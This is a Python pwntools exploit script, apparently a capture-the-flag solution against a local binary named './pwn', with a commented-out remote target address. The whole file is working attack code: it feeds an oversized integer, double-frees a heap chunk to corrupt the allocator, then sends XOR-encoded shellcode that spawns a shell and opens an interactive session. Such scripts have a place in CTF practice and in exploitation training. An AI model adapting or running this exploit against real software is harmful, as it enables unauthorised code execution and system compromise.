from pwn import *
context.arch = 'amd64'
def alloc(p, size, s):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('>')
    p.send(s)

def delete(p):
    p.recvuntil('>')
    p.sendline('2')

def encode(payload):
    ret = ''
    ret += payload[-1]
    for i in range(len(payload)-1):
        ret = chr(ord(payload[len(payload) - i - 2]) ^ ord(ret[0])) + ret
    return ret
	
def main():
    p = process('./pwn')
    # p = remote('172.16.9.24', 9017)
    p.recvuntil('>')
    p.send('\x00')
    p.recvuntil('>')
    p.sendline(str(0x80000000))
    alloc(p, 0x38, 'a')
    delete(p)
    delete(p)
    alloc(p, 0x38, '\x90')
    alloc(p, 0x38, '\x00')
    alloc(p, 0x38, 'The cake is a lie!\x00')
    p.recvuntil('>')
    p.sendline('3')
    payload = encode(asm(shellcraft.amd64.sh()))
    #gdb.attach(p)
    p.send(payload)
    p.interactive()



main()
